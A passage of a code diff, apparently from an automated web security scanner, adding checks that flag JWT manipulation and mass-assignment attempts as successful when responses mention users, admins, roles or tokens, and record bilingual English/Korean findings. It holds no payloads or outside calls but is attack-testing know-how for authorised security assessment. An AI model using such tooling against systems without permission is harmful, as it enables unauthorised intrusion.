+            if status == 200 and ("user" in body_lower or "admin" in body_lower or "token" in body_lower):
+                if payload and ("eyJ" in payload or "alg" in payload):
+                    f = ctx.add_finding(
+                        title=f"JWT Vulnerability — {endpoint}|||JWT 취약점 — {endpoint}",
+                        severity="high",
+                        finding_type="broken_authentication",
+                        description=(f"JWT manipulation succeeded on {endpoint} with payload: {payload[:60]}"
+                                     f"|||{endpoint}에서 JWT 조작 성공: {payload[:60]}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── Mass Assignment ──
+        if vector_id == "WEB-API-001" and not _already_found("mass_assignment", endpoint):
+            if status in (200, 201) and ("admin" in body_lower or "role" in body_lower
+                                          or "isAdmin" in body or "privilege" in body_lower):
+                f = ctx.add_finding(
+                    title=f"Mass Assignment — {endpoint}|||매스 어사인먼트 — {endpoint}",
+                    severity="high",
+                    finding_type="mass_assignment",
+                    description=(f"Mass assignment may have succeeded on {endpoint}: {payload[:60]}"
+                                 f"|||{endpoint}에서 매스 어사인먼트 가능성: {payload[:60]}"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                 except Exception:
                     pass
                 return True
